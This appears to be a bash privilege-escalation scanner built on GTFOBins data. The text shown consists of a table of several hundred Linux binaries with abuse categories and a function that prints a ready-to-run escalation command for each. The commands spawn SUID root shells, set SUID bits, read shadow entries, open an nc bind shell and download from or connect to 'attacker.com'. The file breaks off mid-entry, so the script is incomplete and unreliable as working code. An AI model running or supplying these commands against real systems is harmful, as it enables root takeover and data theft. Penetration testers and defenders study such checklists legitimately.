#!/bin/bash
# GTFOBins Auto-Checker + Extended Linux Privilege Escalation Scanner
# Checks: SUID, SGID, capabilities, sudo, cron, PATH hijack, kernel,
#          docker/lxd groups, NFS, /etc/passwd+shadow, systemd, credentials,
#          LD_PRELOAD, internal services, writable /etc, .service files
# Data: GTFOBins (https://gtfobins.github.io/) — 435 binaries
# Generated: 2026-11-06 | Extended: 2026-11-11

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ========== SUID LOOKUP ==========
is_suid_exploitable() {
  local b="$1"
  case "$b" in
    R) echo 'shell'; return 0 ;;
    aa-exec) echo 'shell'; return 0 ;;
    ab) echo 'download,upload'; return 0 ;;
    acr) echo 'command'; return 0 ;;
    agetty) echo 'shell'; return 0 ;;
    alpine) echo 'file-read'; return 0 ;;
    apache2) echo 'file-read,file-read'; return 0 ;;
    apt-get) echo 'shell,shell'; return 0 ;;
    ar) echo 'file-read'; return 0 ;;
    aria2c) echo 'command,command,download,file-read'; return 0 ;;
    arj) echo 'file-read,file-write'; return 0 ;;
    arp) echo 'file-read'; return 0 ;;
    as) echo 'file-read'; return 0 ;;
    ascii-xfr) echo 'file-read'; return 0 ;;
    ash) echo 'file-write,shell'; return 0 ;;
    aspell) echo 'file-read,file-read'; return 0 ;;
    asterisk) echo 'shell'; return 0 ;;
    atobm) echo 'file-read'; return 0 ;;
    aws) echo 'file-read'; return 0 ;;
    base32) echo 'file-read'; return 0 ;;
    base64) echo 'file-read'; return 0 ;;
    basenc) echo 'file-read'; return 0 ;;
    basez) echo 'file-read'; return 0 ;;
    bash) echo 'download,download,file-read,file-read,file-write,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    batcat) echo 'inherit'; return 0 ;;
    bc) echo 'file-read'; return 0 ;;
    bconsole) echo 'file-read'; return 0 ;;
    bridge) echo 'file-read'; return 0 ;;
    busctl) echo 'inherit,shell,shell'; return 0 ;;
    bzip2) echo 'file-read'; return 0 ;;
    cabal) echo 'shell'; return 0 ;;
    cancel) echo 'upload'; return 0 ;;
    capsh) echo 'shell'; return 0 ;;
    cat) echo 'file-read'; return 0 ;;
    chattr) echo 'privilege-escalation'; return 0 ;;
    chmod) echo 'privilege-escalation'; return 0 ;;
    choom) echo 'shell'; return 0 ;;
    chown) echo 'privilege-escalation'; return 0 ;;
    chroot) echo 'shell'; return 0 ;;
    chrt) echo 'shell'; return 0 ;;
    clamscan) echo 'file-read'; return 0 ;;
    clisp) echo 'shell'; return 0 ;;
    cmp) echo 'file-read'; return 0 ;;
    cobc) echo 'shell'; return 0 ;;
    column) echo 'file-read'; return 0 ;;
    comm) echo 'file-read'; return 0 ;;
    cp) echo 'file-read,file-write,privilege-escalation,privilege-escalation'; return 0 ;;
    cpio) echo 'file-read,file-read,file-write'; return 0 ;;
    cpulimit) echo 'shell'; return 0 ;;
    crash) echo 'inherit'; return 0 ;;
    csh) echo 'file-write,shell'; return 0 ;;
    csplit) echo 'file-read,file-write'; return 0 ;;
    csvtool) echo 'file-read,file-write,shell'; return 0 ;;
    ctr) echo 'shell'; return 0 ;;
    cupsfilter) echo 'file-read'; return 0 ;;
    curl) echo 'download,file-read,file-write,library-load,upload,upload,upload'; return 0 ;;
    cut) echo 'file-read'; return 0 ;;
    dash) echo 'file-write,shell'; return 0 ;;
    date) echo 'file-read'; return 0 ;;
    dc) echo 'shell'; return 0 ;;
    dd) echo 'file-read,file-write'; return 0 ;;
    debugfs) echo 'shell'; return 0 ;;
    dialog) echo 'file-read'; return 0 ;;
    diff) echo 'file-read,file-read'; return 0 ;;
    dig) echo 'file-read'; return 0 ;;
    distcc) echo 'shell'; return 0 ;;
    dmesg) echo 'file-read,inherit'; return 0 ;;
    dmsetup) echo 'shell'; return 0 ;;
    dnsmasq) echo 'command'; return 0 ;;
    docker) echo 'file-read,file-write,shell,shell'; return 0 ;;
    dos2unix) echo 'file-read,file-write'; return 0 ;;
    dosbox) echo 'file-read,file-read,file-write'; return 0 ;;
    dpkg) echo 'inherit'; return 0 ;;
    dvips) echo 'shell'; return 0 ;;
    easyrsa) echo 'shell'; return 0 ;;
    ed) echo 'file-read,file-write,shell'; return 0 ;;
    efax) echo 'file-read'; return 0 ;;
    egrep) echo 'file-read'; return 0 ;;
    elvish) echo 'file-read,file-write,shell'; return 0 ;;
    enscript) echo 'shell'; return 0 ;;
    env) echo 'shell'; return 0 ;;
    eqn) echo 'file-read'; return 0 ;;
    espeak) echo 'file-read'; return 0 ;;
    ex) echo 'inherit,shell'; return 0 ;;
    expand) echo 'file-read'; return 0 ;;
    expect) echo 'file-read,shell'; return 0 ;;
    fastfetch) echo 'command,file-read,shell'; return 0 ;;
    ffmpeg) echo 'library-load'; return 0 ;;
    fgrep) echo 'file-read'; return 0 ;;
    file) echo 'file-read,file-read'; return 0 ;;
    find) echo 'file-read,file-write,shell'; return 0 ;;
    finger) echo 'download,upload'; return 0 ;;
    fish) echo 'shell'; return 0 ;;
    flock) echo 'shell'; return 0 ;;
    fmt) echo 'file-read,file-read'; return 0 ;;
    fold) echo 'file-read'; return 0 ;;
    forge) echo 'shell'; return 0 ;;
    fping) echo 'file-read'; return 0 ;;
    ftp) echo 'download,shell,upload'; return 0 ;;
    fzf) echo 'command,shell'; return 0 ;;
    gawk) echo 'bind-shell,file-read,file-write,reverse-shell,shell'; return 0 ;;
    gcloud) echo 'inherit'; return 0 ;;
    gcore) echo 'file-read'; return 0 ;;
    gdb) echo 'file-write'; return 0 ;;
    genie) echo 'shell'; return 0 ;;
    genisoimage) echo 'file-read,file-read'; return 0 ;;
    getent) echo 'privilege-escalation'; return 0 ;;
    ginsh) echo 'shell'; return 0 ;;
    git) echo 'file-read,file-write,shell'; return 0 ;;
    gnuplot) echo 'shell'; return 0 ;;
    grep) echo 'file-read'; return 0 ;;
    gtester) echo 'file-write,shell'; return 0 ;;
    guile) echo 'shell'; return 0 ;;
    gzip) echo 'file-read'; return 0 ;;
    head) echo 'file-read'; return 0 ;;
    hexdump) echo 'file-read'; return 0 ;;
    hg) echo 'shell'; return 0 ;;
    highlight) echo 'file-read'; return 0 ;;
    hping3) echo 'shell'; return 0 ;;
    iconv) echo 'file-read,file-write'; return 0 ;;
    iftop) echo 'shell'; return 0 ;;
    install) echo 'privilege-escalation'; return 0 ;;
    ionice) echo 'shell'; return 0 ;;
    ip) echo 'file-read,shell'; return 0 ;;
    ispell) echo 'shell'; return 0 ;;
    joe) echo 'shell'; return 0 ;;
    join) echo 'file-read'; return 0 ;;
    jq) echo 'file-read'; return 0 ;;
    jrunscript) echo 'shell'; return 0 ;;
    julia) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    ksshell) echo 'file-read'; return 0 ;;
    kubectl) echo 'upload'; return 0 ;;
    last) echo 'file-read'; return 0 ;;
    latex) echo 'file-read,file-write,shell'; return 0 ;;
    ld.so) echo 'shell'; return 0 ;;
    ldconfig) echo 'library-load'; return 0 ;;
    less) echo 'file-read,file-read,file-write,inherit,shell'; return 0 ;;
    lftp) echo 'shell'; return 0 ;;
    links) echo 'file-read'; return 0 ;;
    logrotate) echo 'file-read,file-write'; return 0 ;;
    logsave) echo 'shell'; return 0 ;;
    look) echo 'file-read'; return 0 ;;
    lp) echo 'upload'; return 0 ;;
    ltrace) echo 'file-read'; return 0 ;;
    lua) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    lxd) echo 'shell,shell'; return 0 ;;
    m4) echo 'command,file-read,shell'; return 0 ;;
    mail) echo 'shell,shell'; return 0 ;;
    make) echo 'file-read,file-write,shell'; return 0 ;;
    man) echo 'file-read,inherit,shell'; return 0 ;;
    mawk) echo 'file-read,file-write,shell'; return 0 ;;
    minicom) echo 'shell,shell'; return 0 ;;
    more) echo 'file-read,shell'; return 0 ;;
    mosquitto) echo 'file-read'; return 0 ;;
    msgattrib) echo 'file-read'; return 0 ;;
    msgcat) echo 'file-read'; return 0 ;;
    msgconv) echo 'file-read'; return 0 ;;
    msgfilter) echo 'file-read,shell'; return 0 ;;
    msgmerge) echo 'file-read'; return 0 ;;
    msguniq) echo 'file-read'; return 0 ;;
    multitime) echo 'shell'; return 0 ;;
    mv) echo 'file-write,privilege-escalation'; return 0 ;;
    mysql) echo 'library-load,shell'; return 0 ;;
    nano) echo 'file-read,file-write,shell,shell'; return 0 ;;
    nasm) echo 'file-read'; return 0 ;;
    nc) echo 'bind-shell,download,download,reverse-shell,upload,upload'; return 0 ;;
    ncdu) echo 'shell'; return 0 ;;
    ncftp) echo 'shell'; return 0 ;;
    nginx) echo 'library-load'; return 0 ;;
    nice) echo 'shell'; return 0 ;;
    nl) echo 'file-read'; return 0 ;;
    nm) echo 'file-read'; return 0 ;;
    nmap) echo 'file-read,file-write'; return 0 ;;
    node) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    nohup) echo 'command,shell'; return 0 ;;
    nsenter) echo 'shell'; return 0 ;;
    ntpdate) echo 'file-read'; return 0 ;;
    octave) echo 'file-read,file-write,shell'; return 0 ;;
    od) echo 'file-read'; return 0 ;;
    opencode) echo 'command'; return 0 ;;
    openssl) echo 'download,file-read,file-write,file-write,library-load,reverse-shell,upload'; return 0 ;;
    openvpn) echo 'file-read,shell'; return 0 ;;
    pandoc) echo 'file-read,file-write'; return 0 ;;
    paste) echo 'file-read'; return 0 ;;
    pax) echo 'file-read'; return 0 ;;
    pdflatex) echo 'file-read,file-write,shell'; return 0 ;;
    pdftex) echo 'shell'; return 0 ;;
    perf) echo 'shell'; return 0 ;;
    perl) echo 'file-read'; return 0 ;;
    pexec) echo 'shell'; return 0 ;;
    pg) echo 'file-read,shell'; return 0 ;;
    php) echo 'command,command,command,download,file-read,file-write,reverse-shell,shell,shell,shell,shell,upload'; return 0 ;;
    pic) echo 'file-read,shell'; return 0 ;;
    pidstat) echo 'shell'; return 0 ;;
    plymouth) echo 'shell'; return 0 ;;
    pr) echo 'file-read'; return 0 ;;
    psftp) echo 'shell'; return 0 ;;
    psql) echo 'inherit,shell'; return 0 ;;
    ptx) echo 'file-read'; return 0 ;;
    python) echo 'download,file-read,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    qpdf) echo 'file-read'; return 0 ;;
    rc) echo 'shell'; return 0 ;;
    readelf) echo 'file-read'; return 0 ;;
    redis) echo 'file-write'; return 0 ;;
    restic) echo 'command,command,shell,shell,upload'; return 0 ;;
    rev) echo 'file-read'; return 0 ;;
    rlogin) echo 'upload'; return 0 ;;
    rlwrap) echo 'file-write,shell'; return 0 ;;
    rsync) echo 'shell'; return 0 ;;
    rtorrent) echo 'shell'; return 0 ;;
    run-parts) echo 'shell,shell'; return 0 ;;
    runscript) echo 'shell'; return 0 ;;
    sash) echo 'shell'; return 0 ;;
    scanmem) echo 'shell'; return 0 ;;
    scp) echo 'download,shell,shell,upload'; return 0 ;;
    script) echo 'file-write,shell'; return 0 ;;
    scrot) echo 'shell'; return 0 ;;
    sed) echo 'file-read,file-write,shell,shell'; return 0 ;;
    setarch) echo 'shell'; return 0 ;;
    setcap) echo 'privilege-escalation'; return 0 ;;
    setfacl) echo 'privilege-escalation'; return 0 ;;
    setlock) echo 'shell'; return 0 ;;
    sftp) echo 'download,shell,upload'; return 0 ;;
    shred) echo 'file-write'; return 0 ;;
    shuf) echo 'file-read,file-write'; return 0 ;;
    slsh) echo 'shell'; return 0 ;;
    socat) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    socket) echo 'bind-shell,reverse-shell'; return 0 ;;
    soelim) echo 'file-read'; return 0 ;;
    softlimit) echo 'shell'; return 0 ;;
    sort) echo 'file-read,file-write'; return 0 ;;
    split) echo 'file-read,file-write,shell'; return 0 ;;
    sqlite3) echo 'file-read,file-write,shell'; return 0 ;;
    ss) echo 'file-read'; return 0 ;;
    ssh) echo 'download,file-read,shell,upload'; return 0 ;;
    ssh-agent) echo 'shell'; return 0 ;;
    ssh-keygen) echo 'library-load'; return 0 ;;
    ssh-keyscan) echo 'file-read'; return 0 ;;
    sshpass) echo 'shell'; return 0 ;;
    start-stop-daemon) echo 'shell'; return 0 ;;
    stdbuf) echo 'shell'; return 0 ;;
    strace) echo 'shell'; return 0 ;;
    strings) echo 'file-read'; return 0 ;;
    sysctl) echo 'command,file-read'; return 0 ;;
    systemctl) echo 'inherit,shell'; return 0 ;;
    tac) echo 'file-read'; return 0 ;;
    tail) echo 'file-read'; return 0 ;;
    tar) echo 'download,file-read,file-write,shell,shell,shell,upload'; return 0 ;;
    task) echo 'shell'; return 0 ;;
    tasksh) echo 'shell'; return 0 ;;
    tbl) echo 'file-read'; return 0 ;;
    tclsh) echo 'library-load,reverse-shell,shell'; return 0 ;;
    tcpdump) echo 'file-write'; return 0 ;;
    tcsh) echo 'file-write,shell'; return 0 ;;
    tdbtool) echo 'shell'; return 0 ;;
    tee) echo 'file-write'; return 0 ;;
    telnet) echo 'reverse-shell,shell'; return 0 ;;
    terraform) echo 'file-read'; return 0 ;;
    tex) echo 'shell'; return 0 ;;
    tftp) echo 'download,upload'; return 0 ;;
    tic) echo 'file-read'; return 0 ;;
    time) echo 'shell'; return 0 ;;
    timeout) echo 'shell'; return 0 ;;
    tmate) echo 'shell'; return 0 ;;
    tmux) echo 'file-read,shell,shell'; return 0 ;;
    troff) echo 'file-read'; return 0 ;;
    ul) echo 'file-read'; return 0 ;;
    unexpand) echo 'file-read'; return 0 ;;
    uniq) echo 'file-read'; return 0 ;;
    unshare) echo 'shell'; return 0 ;;
    unsquashfs) echo 'privilege-escalation'; return 0 ;;
    unzip) echo 'privilege-escalation'; return 0 ;;
    update-alternatives) echo 'file-write'; return 0 ;;
    urlget) echo 'file-read'; return 0 ;;
    uuencode) echo 'file-read'; return 0 ;;
    varnishncsa) echo 'file-write'; return 0 ;;
    vi) echo 'file-read,file-write,shell,shell,shell,shell'; return 0 ;;
    vigr) echo 'inherit'; return 0 ;;
    vim) echo 'file-read'; return 0 ;;
    vipw) echo 'inherit'; return 0 ;;
    w3m) echo 'file-read'; return 0 ;;
    watch) echo 'shell,shell'; return 0 ;;
    wc) echo 'file-read'; return 0 ;;
    wget) echo 'download,file-read,file-write,shell,upload,upload'; return 0 ;;
    whiptail) echo 'file-read'; return 0 ;;
    whois) echo 'download,upload'; return 0 ;;
    wish) echo 'inherit'; return 0 ;;
    xargs) echo 'file-read,shell,shell,shell'; return 0 ;;
    xdotool) echo 'shell'; return 0 ;;
    xmodmap) echo 'file-read'; return 0 ;;
    xmore) echo 'file-read'; return 0 ;;
    xpad) echo 'file-read'; return 0 ;;
    xxd) echo 'file-read,file-write'; return 0 ;;
    xz) echo 'file-read'; return 0 ;;
    yash) echo 'shell'; return 0 ;;
    zic) echo 'command'; return 0 ;;
    zip) echo 'file-read,shell'; return 0 ;;
    zless) echo 'inherit'; return 0 ;;
    zsh) echo 'download,file-read,file-read,file-write,inherit,reverse-shell,shell,upload'; return 0 ;;
    zsoelim) echo 'file-read'; return 0 ;;
    *) return 1 ;;
  esac
}

get_suid_exploit() {
  local b="$1"
  case "$b" in
    R) echo 'R --no-save -e '\''system("/bin/sh")'\''' ;;
    aa-exec) echo 'aa-exec /bin/sh' ;;
    ab) echo 'ab -v2 http://attacker.com/path/to/input-file' ;;
    acr) echo 'echo -e '\''x:\\n\\t/bin/sh 1>&0 2>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file' ;;
    agetty) echo 'agetty -l /bin/sh -o -p -a root tty' ;;
    alpine) echo 'alpine -F /path/to/input-file' ;;
    apache2) echo 'apache2 -f /path/to/input-file' ;;
    apt-get) echo 'echo '\''Dpkg::Pre-Invoke {"/bin/sh;false"}'\'' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl' ;;
    ar) echo 'ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file' ;;
    aria2c) echo 'echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain' ;;
    arj) echo 'arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file' ;;
    arp) echo 'arp -v -f /path/to/input-file' ;;
    as) echo 'as @/path/to/input-file' ;;
    ascii-xfr) echo 'ascii-xfr -ns /path/to/input-file' ;;
    ash) echo 'ash -p' ;;
    aspell) echo 'aspell -c /path/to/input-file' ;;
    asterisk) echo 'asterisk -r
!/bin/sh' ;;
    atobm) echo 'atobm /path/to/input-file' ;;
    aws) echo 'aws ec2 describe-instances --filter file:///path/to/input-file' ;;
    base32) echo 'base32 /path/to/input-file | base32 --decode' ;;
    base64) echo 'base64 /path/to/input-file | base64 --decode' ;;
    basenc) echo 'basenc --base64 /path/to/input-file | basenc -d --base64' ;;
    basez) echo 'basez /path/to/input-file | basez --decode' ;;
    bash) echo 'bash -p' ;;
    batcat) echo 'batcat --paging always /etc/hosts' ;;
    bc) echo 'bc -s /path/to/input-file
quit' ;;
    bconsole) echo 'bconsole -c /path/to/file-input' ;;
    bridge) echo 'bridge -b /path/to/input-file' ;;
    busctl) echo 'busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='\''/bin/sh -p -i 0<&2 1>&2'\''' ;;
    bzip2) echo 'bzip2 -c /path/to/input-file | bzip2 -d' ;;
    cabal) echo 'cabal exec --project-file=/dev/null -- /bin/sh -p' ;;
    cancel) echo 'cancel -h attacker.com:12345 -u DATA' ;;
    capsh) echo 'capsh --gid=0 --uid=0 --' ;;
    cat) echo 'cat /path/to/input-file' ;;
    chattr) echo 'chattr +i /path/to/input-file' ;;
    chmod) echo 'chmod 6777 /path/to/input-file' ;;
    choom) echo 'choom -n 0 -- /bin/sh -p' ;;
    chown) echo 'chown $(id -un):$(id -gn) /path/to/input-file' ;;
    chroot) echo 'chroot / /bin/sh -p' ;;
    chrt) echo 'chrt 1 /bin/sh -p' ;;
    clamscan) echo 'touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE '\''s/^(.*): No such file or directory$/\\1/p'\''' ;;
    clisp) echo 'clisp -x '\''(ext:run-shell-command "/bin/sh")(ext:exit)'\''' ;;
    cmp) echo 'cmp /path/to/input-file /dev/zero -b -l' ;;
    cobc) echo 'echo '\''CALL "SYSTEM" USING "/bin/sh".'\'' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file' ;;
    column) echo 'column /path/to/input-file' ;;
    comm) echo 'comm /path/to/input-file /dev/null' ;;
    cp) echo 'cp /path/to/input-file /dev/stdout' ;;
    cpio) echo 'echo /path/to/input-file | cpio -o' ;;
    cpulimit) echo 'cpulimit -l 100 -f -- /bin/sh -p' ;;
    crash) echo 'crash -h' ;;
    csh) echo 'csh -b' ;;
    csplit) echo 'csplit /path/to/input-file 1
cat xx01' ;;
    csvtool) echo 'csvtool call '\''/bin/sh;false'\'' /etc/hosts' ;;
    ctr) echo 'ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x' ;;
    cupsfilter) echo 'cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file' ;;
    curl) echo 'curl http://attacker.com/path/to/input-file -o /path/to/output-file' ;;
    cut) echo 'cut -d '\'''\'' -f1 /path/to/input-file' ;;
    dash) echo 'dash' ;;
    date) echo 'date -f /path/to/input-file' ;;
    dc) echo 'dc -e '\''!/bin/sh'\''' ;;
    dd) echo 'dd if=/path/to/input-file' ;;
    debugfs) echo 'debugfs
!/bin/sh' ;;
    dialog) echo 'dialog --textbox /path/to/input-file 0 0' ;;
    diff) echo 'diff --line-format=%L /dev/null /path/to/input-file' ;;
    dig) echo 'dig -f /path/to/input-file' ;;
    distcc) echo 'distcc /bin/sh -p' ;;
    dmesg) echo 'dmesg -rF /path/to/input-file' ;;
    dmsetup) echo 'dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '\''/bin/sh -p -s'\''' ;;
    dnsmasq) echo 'dnsmasq --conf-script='\''/path/to/command 1>&2'\''' ;;
    docker) echo 'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh' ;;
    dos2unix) echo 'dos2unix -f -O /path/to/input-file' ;;
    dosbox) echo 'dosbox -c '\''mount c /'\'' -c '\''type c:\\path\\to\\input'\''' ;;
    dpkg) echo 'dpkg -l' ;;
    dvips) echo 'dvips -R0 texput.dvi' ;;
    easyrsa) echo 'echo '\''set_var X "$(/bin/sh 1>&0)"'\'' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file' ;;
    ed) echo 'ed
!/bin/sh
q' ;;
    efax) echo 'efax -d /path/to/input-file' ;;
    egrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    elvish) echo 'elvish' ;;
    enscript) echo 'enscript /dev/null -qo /dev/null -I '\''/bin/sh >&2'\''' ;;
    env) echo 'env /bin/sh -p' ;;
    eqn) echo 'eqn /path/to/input-file' ;;
    espeak) echo 'espeak -qXf /path/to/input-file' ;;
    ex) echo 'ex -c '\'':!/bin/sh'\''' ;;
    expand) echo 'expand /path/to/input-file' ;;
    expect) echo 'expect -c '\''spawn /bin/sh -p;interact'\''' ;;
    fastfetch) echo 'echo '\''{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}'\'' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc' ;;
    ffmpeg) echo 'ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J' ;;
    fgrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    file) echo 'file -f /path/to/input-file' ;;
    find) echo 'find . -exec /bin/sh -p \\; -quit' ;;
    finger) echo 'finger x@attacker.com' ;;
    fish) echo 'fish' ;;
    flock) echo 'flock -u / /bin/sh -p' ;;
    fmt) echo 'fmt -pNON_EXISTING_PREFIX /path/to/input-file' ;;
    fold) echo 'fold -w999 /path/to/input-file' ;;
    forge) echo 'echo '\''#!/bin/sh'\'' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file' ;;
    fping) echo 'fping -f /path/to/input-file' ;;
    ftp) echo 'ftp
!/bin/sh' ;;
    fzf) echo 'fzf --bind '\''enter:execute(/bin/sh)'\''' ;;
    gawk) echo 'gawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    gcloud) echo 'gcloud help' ;;
    gcore) echo 'gcore $PID' ;;
    gdb) echo 'gdb -nx -ex '\''dump value /path/to/output-file "DATA"'\'' -ex quit' ;;
    genie) echo 'genie -c '\''/bin/sh'\''' ;;
    genisoimage) echo 'genisoimage -q -o - /path/to/input-file' ;;
    getent) echo 'getent shadow' ;;
    ginsh) echo 'ginsh
!/bin/sh' ;;
    git) echo 'ln -s /bin/sh git-x
git --exec-path=. x -p' ;;
    gnuplot) echo 'gnuplot -e '\''system("/bin/sh 1>&0")'\''' ;;
    grep) echo 'grep '\'''\'' /path/to/input-file' ;;
    gtester) echo 'echo '\''#!/bin/sh -p'\'' >/path/to/temp-file
echo '\''exec /bin/sh -p 0<&1'\'' >>/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file' ;;
    guile) echo 'guile -c '\''(system "/bin/sh")'\''' ;;
    gzip) echo 'gzip -c /path/to/input-file | gzip -d' ;;
    head) echo 'head -c-0 /path/to/input-file' ;;
    hexdump) echo 'hd /path/to/input-file' ;;
    hg) echo 'hg --config alias.x='\''!/bin/sh'\'' x' ;;
    highlight) echo 'highlight --no-doc --failsafe /path/to/input-file' ;;
    hping3) echo 'hping3
/bin/sh -p' ;;
    iconv) echo 'iconv -f 8859_1 -t 8859_1 /path/to/input-file' ;;
    iftop) echo 'iftop
!/bin/sh' ;;
    install) echo 'install -m 6777 /path/to/input-file /path/to/output-dir/' ;;
    ionice) echo 'ionice /bin/sh -p' ;;
    ip) echo 'ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo' ;;
    ispell) echo 'ispell /etc/hosts
!/bin/sh -p' ;;
    joe) echo 'joe
^K!/bin/sh' ;;
    join) echo 'join -a 2 /dev/null /path/to/input-file' ;;
    jq) echo 'jq -Rr . /path/to/input-file' ;;
    jrunscript) echo 'jrunscript -e '\''exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'\''' ;;
    julia) echo 'julia -e '\''run(`/bin/sh -p`)'\''' ;;
    ksshell) echo 'ksshell -i /path/to/input-file' ;;
    kubectl) echo 'kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/' ;;
    last) echo 'last -a -f /path/to/input-file' ;;
    latex) echo 'latex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    ld.so) echo '/path/to/ld.so /bin/sh -p' ;;
    ldconfig) echo 'echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping' ;;
    less) echo 'less /etc/hosts
!/bin/sh' ;;
    lftp) echo 'lftp -c '\''!/bin/sh'\''' ;;
    links) echo 'links /path/to/input-file' ;;
    logrotate) echo 'logrotate /path/to/input-file' ;;
    logsave) echo 'logsave /dev/null /bin/sh -i -p' ;;
    look) echo 'look '\'''\'' /path/to/input-file' ;;
    lp) echo 'lp /path/to/input-file -h attacker.com' ;;
    ltrace) echo 'ltrace -F /path/to/input-file /dev/null' ;;
    lua) echo 'lua -e '\''os.execute("/bin/sh")'\''' ;;
    lxd) echo 'lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh' ;;
    m4) echo 'echo '\''esyscmd(/bin/sh 0<&2 1>&2)'\'' | m4' ;;
    mail) echo 'mail --exec='\''!/bin/sh'\''' ;;
    make) echo 'make --eval='\''$(shell /bin/sh 1>&0)'\'' .' ;;
    man) echo 'man '\''-H/bin/sh #'\'' man' ;;
    mawk) echo 'mawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    minicom) echo 'minicom -D /dev/null' ;;
    more) echo 'more /etc/hosts
!/bin/sh' ;;
    mosquitto) echo 'mosquitto -c /path/to/input-file' ;;
    msgattrib) echo 'msgattrib -P /path/to/input-file' ;;
    msgcat) echo 'msgcat -P /path/to/input-file' ;;
    msgconv) echo 'msgconv -P /path/to/input-file' ;;
    msgfilter) echo 'echo x | msgfilter -P /bin/sh -p -c '\''/bin/sh -p 0<&2 1>&2; kill $PPID'\''' ;;
    msgmerge) echo 'msgmerge -P /path/to/input-file /dev/null' ;;
    msguniq) echo 'msguniq -P /path/to/input-file' ;;
    multitime) echo 'multitime /bin/sh -p' ;;
    mv) echo 'echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file' ;;
    mysql) echo 'mysql -e '\''\\! /bin/sh'\''' ;;
    nano) echo 'nano
^R^X
reset; sh 1>&0 2>&0' ;;
    nasm) echo 'nasm -@ /path/to/input-file' ;;
    nc) echo 'nc -l -p 12345 -e /bin/sh' ;;
    ncdu) echo 'ncdu
b' ;;
    ncftp) echo 'ncftp
!/bin/sh -p' ;;
    nginx) echo 'cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file' ;;
    nice) echo 'nice /bin/sh -p' ;;
    nl) echo 'nl -bn -w1 -s '\'''\'' /path/to/input-file' ;;
    nm) echo 'nm /path/to/input-file' ;;
    nmap) echo 'nmap -iL /path/to/input-file' ;;
    node) echo 'node -e '\''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'\''' ;;
    nohup) echo 'nohup /bin/sh -p -c '\''/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'\''' ;;
    nsenter) echo 'nsenter /bin/sh -p' ;;
    ntpdate) echo 'ntpdate -a x -k /path/to/input-file -d localhost' ;;
    octave) echo 'octave-cli --eval '\''system("/bin/sh")'\''' ;;
    od) echo 'od -An -c -w999 /path/to/input-file' ;;
    opencode) echo 'opencode
! /path/to/command' ;;
    openssl) echo 'openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file' ;;
    openvpn) echo 'openvpn --dev null --script-security 2 --up '\''/bin/sh -p -s'\''' ;;
    pandoc) echo 'pandoc -t plain /path/to/input-file' ;;
    paste) echo 'paste /path/to/input-file' ;;
    pax) echo 'pax -w /path/to/input-file | tar -xO' ;;
    pdflatex) echo 'pdflatex --shell-escape '\''\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\''' ;;
    pdftex) echo 'pdftex --shell-escape '\''\\write18{/bin/sh}\\end'\''' ;;
    perf) echo 'perf stat /bin/sh -p' ;;
    perl) echo 'perl -ne print /path/to/input-file' ;;
    pexec) echo 'pexec /bin/sh -p' ;;
    pg) echo 'pg /etc/hosts
!/bin/sh' ;;
    php) echo 'php -r '\''system("/bin/sh -i");'\''' ;;
    pic) echo 'pic -U
.PS
sh X sh X' ;;
    pidstat) echo 'pidstat -e /bin/sh -p' ;;
    plymouth) echo 'plymouth ask-for-password --prompt=x --command='\''/bin/sh -p'\''' ;;
    pr) echo 'pr -T /path/to/input-file' ;;
    psftp) echo 'psftp
!/bin/sh' ;;
    psql) echo 'psql
\\! /bin/sh' ;;
    ptx) echo 'ptx -w 999 /path/to/input-file' ;;
    python) echo 'python -c '\''import os; os.execl("/bin/sh", "sh", "-p")'\''' ;;
    qpdf) echo 'qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
